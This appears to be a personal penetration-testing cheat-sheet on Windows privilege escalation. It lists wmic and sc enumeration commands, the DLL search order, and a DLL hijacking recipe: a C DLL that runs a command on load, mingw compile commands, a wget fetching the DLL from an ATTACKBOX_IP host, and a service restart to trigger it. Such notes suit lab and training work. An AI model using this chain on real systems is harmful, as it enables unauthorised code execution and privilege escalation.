
## Software vulnerabilites
### wmic
`wmic product`
`wmic product get name,version,vendor`
`wmic service list brief`
`wmic service list brief | findstr  "Running"`
more information on any service, you can simply use the `sc qc`
`where /r c: *term*`
***
## DLL Hijacking
Some Windows executables will use Dynamic Link Libraries (DLLs) when running.

#### DLL locations
If **SafeDllSearchMode** is enabled, the search order is as follows:
1.  The directory from which the application loaded.
2.  The system directory. Use the **[GetSystemDirectory](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya)** function to get the path of this directory.
3.  The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched.
4.  The Windows directory. Use the **[GetWindowsDirectory](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya)** function to get the path of this directory.
5.  The current directory.
6.  The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

If **SafeDllSearchMode** is disabled, the search order is as follows:
1.  The directory from which the application loaded.
2.  The current directory.
3.  The system directory. Use the **[GetSystemDirectory](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya)** function to get the path of this directory.
4.  The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched.
5.  The Windows directory. Use the **[GetWindowsDirectory](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya)** function to get the path of this directory.
6.  The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Tool ProcMon can be used to find dll files. Need admin to run so have to download and install target software yourself
***
#### Compile dll
skeleton DLL in C
```
#include <windows.h>  
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
	if (dwReason == DLL_PROCESS_ATTACH) {
		system("cmd.exe /k whoami > C:\\Temp\\dll.txt");
		ExitProcess(0);
	}     
	return TRUE;
}
```
`apt install gcc-mingw-w64-x86-64`
`x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll`
`wget -O hijackme.dll ATTACKBOX_IP:PORT/hijackme.dll`

`sc stop dllsvc & sc start dllsvc`
